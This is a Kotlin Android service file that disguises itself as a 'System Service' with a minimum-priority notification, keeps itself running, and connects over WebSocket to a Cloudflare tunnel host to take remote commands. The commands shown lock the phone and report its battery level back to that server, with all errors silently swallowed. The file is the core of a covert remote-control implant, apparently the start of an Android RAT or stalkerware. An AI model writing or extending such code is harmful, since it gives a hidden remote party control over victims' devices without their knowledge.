package com.system.service.core

import android.app.*
import android.content.Intent
import android.os.IBinder
import androidx.core.app.NotificationCompat
import org.json.JSONObject

class CoreService : Service() {

    companion object {
        var instance: CoreService? = null
        var SERVER_URL = "wss://aged-faced-challenged-ips.trycloudflare.com"
    }

    private var wsManager: WebSocketManager? = null

    override fun onCreate() {
        super.onCreate()
        instance = this
        createNotificationChannel()
        startForeground(1, buildNotification())
        try {
            connectServer()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        wsManager?.disconnect()
    }

    private fun connectServer() {
        wsManager = WebSocketManager(
            serverUrl = SERVER_URL,
            onMessage = { handleCommand(it) },
            onConnected = { },
            onDisconnected = { }
        )
        wsManager?.connect()
    }

    private fun handleCommand(data: JSONObject) {
        try {
            when (data.optString("command")) {
                "lock_screen" -> lockScreen()
                "get_battery" -> sendBattery()
            }
        } catch (e: Exception) { }
    }

    fun sendData(type: String, data: JSONObject) {
        try {
            data.put("type", type)
            data.put("timestamp", System.currentTimeMillis())
            wsManager?.send(data)
        } catch (e: Exception) { }
    }

    private fun lockScreen() {
        try {
            val dpm = getSystemService(DEVICE_POLICY_SERVICE)
                as android.app.admin.DevicePolicyManager
            dpm.lockNow()
        } catch (e: Exception) { }
    }

    private fun sendBattery() {
        try {
            val bm = getSystemService(BATTERY_SERVICE)
                as android.os.BatteryManager
            val level = bm.getIntProperty(
                android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
            sendData("battery", JSONObject().apply {
                put("level", level)
            })
        } catch (e: Exception) { }
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            "main", "System",
            NotificationManager.IMPORTANCE_MIN)
        getSystemService(NotificationManager::class.java)
            .createNotificationChannel(channel)
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, "main")
            .setContentTitle("System Service")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    override fun onStartCommand(
        intent: Intent?, f: Int, id: Int
    ) = START_STICKY

    override fun onBind(intent: Intent?): IBinder? = null
}
